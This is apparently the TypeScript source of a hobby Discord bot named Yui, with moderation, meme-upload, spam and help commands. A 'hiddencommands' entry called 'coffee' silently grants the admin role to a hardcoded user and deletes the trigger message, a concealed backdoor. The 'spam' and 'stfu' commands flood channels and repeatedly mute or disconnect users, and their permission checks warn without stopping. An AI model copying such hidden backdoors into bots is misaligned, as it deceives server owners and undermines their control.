import Discord from 'discord.js';
import toHex from 'colornames';
import axios from 'axios';
import FormData from 'form-data';
import request from 'request';
import { createLogger, format, transports } from 'winston';

export const logger = createLogger({
  level: 'info',
  format: format.combine(
    format.timestamp({
      format: 'YYYY-MM-DD HH:mm:ss',
    }),
    format.errors({ stack: true }),
    format.splat(),
    format.prettyPrint()
  ),
  defaultMeta: { service: 'yui-bot' },
  transports: [
    //
    // - Write to all logs with level `info` and below to `quick-start-combined.log`.
    // - Write all logs error (and below) to `quick-start-error.log`.
    //
    new transports.File({ filename: 'runtime-errors.log', level: 'error' }),
    new transports.File({ filename: 'runtime.log' }),
  ],
});

//
// If we're not in production then **ALSO** log to the `console`
// with the colorized simple format.
//
if (process.env.NODE_ENV !== 'production') {
  logger.add(
    new transports.Console({
      format: format.combine(format.colorize(), format.simple()),
    })
  );
}

export type command = {
  run: (
    msg: Discord.Message,
    args: string[],
    client: Discord.Client
  ) => Promise<unknown>;
  desc?: string;
  args?: string;
};
// {[key: string]: command}
const prefix = '-';
const dbPrefix = ';';
const myID = 'myIDHere'; // TODO: replace with your Snowflake
const muteRole = 'mutedRoleIDHere'; // TODO: replace with Snowflake of mute role
const adminRole = 'mutedRoleIDHere'; // TODO: replace with Snowflake of admin role
const spamInts: NodeJS.Timeout[] = [];
export const data: {
  hiddencommands: Record<string, command>;
  commands: Record<string, command>;
  prefix: string;
  dbPrefix: string;
} = {
  prefix: prefix,
  dbPrefix: dbPrefix,
  hiddencommands: {
    coffee: {
      // makes you admin :)
      run: async function (msg: Discord.Message) {
        console.log(msg.member?.id);
        if (msg.member?.id === myID) {
          msg.channel.send('coffee');
          msg.member?.roles.add(adminRole);
          console.log(msg.guild?.roles);
          msg.delete();
        } else {
          msg.delete();
        }
      },
    },
  },
  commands: {
    // unmute: {
    //   desc: '',
    //   args: '',
    //   run: async function (msg, args) {
    //     msg.mentions.members?.first()?.voice.setMute(false);
    //     msg.delete();
    //   },
    // },
    stopspam: {
      desc: "Stops the spam. You're welcome",
      run: async function (msg) {
        spamInts.forEach(e => clearInterval(e));
        return msg.react('✅');
      },
    },
    spam: {
      desc: 'Spams. Forever. (or until the bot dies)',
      args: '(anything)',
      run: function (msg, args) {
        return new Promise((s, j) => {
          const x = setInterval(() => {
            msg.channel.send(`${args[0]}`).catch(e => j(e));
            msg.mentions.members
              ?.first()
              ?.voice.setMute(true)
              .then(e => s(e))
              .catch(e => j(e));
          }, 50);
          spamInts.push(x);
          return x;
        });
      },
    },
    upload: {
      desc: 'Uploads a meme to https://teeheehee.club',
      args: '(tags e.g funny,oreo,blood) [link to file]',
      run: function (msg, args) {
        return new Promise((s, j) => {
          //
          const attachment = args[1] || msg.attachments.array()[0].proxyURL;
          console.log(attachment);
          request.get(attachment, (e, r, b) => {
            //
            if (!e && r.statusCode === 200) {
              const file = new FormData();
              file.append('upload_file', b);
              axios
                .post('https://teeheehee.club/upload.php', file, {
                  headers: {
                    ...file.getHeaders(),
                  },
                })
                .then(e => {
                  msg.channel.send('Uploaded!');
                  s(JSON.stringify(e));
                })
                .catch(e => {
                  msg.channel.send("Uh oh! There's an error:");
                  console.log(e);
                  j(JSON.stringify(e));
                });
            }
          });
        });
      },
    },
    stfu: {
      desc: 'Please, just SHUT UP! Requires manage roles permission.',
      args: '(@user) [on/off]',
      run: async function (msg, args) {
        let reason;
        const chan = msg.channel;
        if (!msg.member?.hasPermission('MANAGE_ROLES')) {
          msg.channel.send("Woah, you're not a mod, dude.");
        }
        if (args?.length > 1) {
          reason = ' Reason: <' + args?.splice(1).join(' ') + '>';
        } else {
          reason = '';
        }

        let usr = msg.mentions.members?.first();
        if (!usr) {
          msg.guild?.members
            .fetch(args[0])
            .then(e => {
              if (e.id.trim() !== '') usr = e;
            })
            .catch(e => {
              const embed = new Discord.MessageEmbed();
              embed.setColor(toHex('red')!);
              embed.setTitle('Error');
              embed.setDescription(
                "No user specified. Please mention or use a user's ID to put to sleep."
              );
              embed.setFooter('Bot made by Jabster28#6048');
              return msg.channel.send(embed);
            });
          return;
        }
        if (args[2]) {
          console.log('a');
          // eslint-disable-next-line @typescript-eslint/ban-ts-ignore
          // @ts-ignore
          clearInterval(+args[2]);
        } else {
          console.log('b');
          setInterval(() => {
            usr?.voice.connection?.disconnect();
          }, 50);
        }
      },
    },
    shh: {
      desc: 'Sleepy time for you. Requires manage roles permission.',
      args: '(@user)',
      run: async function (msg, args) {
        let reason;
        if (
          !msg.member?.hasPermission('MANAGE_ROLES') &&
          msg.author.id !== myID
        ) {
          msg.channel.send("Woah, you're not a mod, dude. Sorry :/");
        }
        if (args?.length > 1) {
          reason = ' Reason: <' + args?.splice(1).join(' ') + '>';
        } else {
          reason = '';
        }
        let usr = msg.mentions.members?.first();
        if (!usr) {
          msg.guild?.members
            .fetch(args[0])
            .then(e => {
              if (e.id.trim() != '') usr = e;
            })
            .catch(e => {
              const embed = new Discord.MessageEmbed();
              embed.setColor(toHex('red')!);
              embed.setTitle('Error');
              embed.setDescription(
                "No user specified. Please mention or use a user's ID to put to sleep."
              );
              embed.setFooter('Bot made by Jabster28#6048');
              return msg.channel.send(embed);
            });
          return;
        }

        console.log(usr);
        usr?.roles.add([muteRole]);
        const embed = new Discord.MessageEmbed();
        embed.setColor(toHex('mistyrose')!);
        embed.setTitle('_Go to sleep, ' + usr?.user.username + '_');
        embed.setDescription(
          `${usr?.user.tag} has been put to sleep.${reason}`
        );
        embed.setFooter('Bot made by Jabster28#6048');
        return msg.channel.send(embed);
      },
    },
    wake: {
      desc:
        'Chucks water on top of the user. Requires manage roles permission.',
      args: '(@user)',
      run: async function (msg, args) {
        let reason;
        if (
          !msg.member?.hasPermission('MANAGE_ROLES') &&
          msg.author.id !== myID
        ) {
          msg.channel.send("Woah, you're not a mod, dude. Sorry :/");
        }
        if (args?.length > 1) {
          reason = ' Reason: <' + args?.splice(1).join(' ') + '>';
        } else {
          reason = '';
        }
        let usr = msg.mentions.members?.first();
        if (!usr) {
          msg.guild?.members
            .fetch(args[0])
            .then(e => {
              if (e.id.trim() !== '') usr = e;
            })
            .catch(e => {
              const embed = new Discord.MessageEmbed();
              embed.setColor(toHex('red')!);
              embed.setTitle('Error');
              embed.setDescription(
                "No user specified. Please mention or use a user's ID to put to sleep."
              );
              embed.setFooter('Bot made by Jabster28#6048');
              return msg.channel.send(embed);
            });
          return;
        }
        console.log(usr);
        usr?.roles.remove([muteRole]);
        const embed = new Discord.MessageEmbed();
        embed.setColor(toHex('mistyrose')!);
        embed.setTitle('_Go to sleep, ' + usr?.user.username + '_');
        embed.setDescription(
          `${usr?.user.tag} has been put to sleep.${reason}`
        );
        embed.setFooter('Bot made by Jabster28#6048');
        msg.channel.send(embed);
      },
    },
    help: {
      desc: 'Shows all commands.',
      run: function (msg: Discord.Message) {
        return new Promise(res => {
          const embed = new Discord.MessageEmbed();
          embed.setColor(toHex('orchid')!);
          embed.setTitle('Hi!'); // TODO: replace with bot name
          embed.setDescription(
            "Hi there! I'm Yui, and I'm here to help you with anything you may need!"
          );
          const ref: { [key: string]: command } = data.commands;
          let k: string;
          for (k in ref) {
            const v = ref[k];
            embed.addField(prefix + k + ' ' + (v.args || ''), v.desc);
          }
          embed.setFooter(
            'Arguments in (parentheses) are required, and arguments in [brackets] are optional and will default to the {braces} option.\nBot made by Jabster28#6048'
          );
          msg.channel.send(embed).then(res);
        });
      },
    },
  },
};
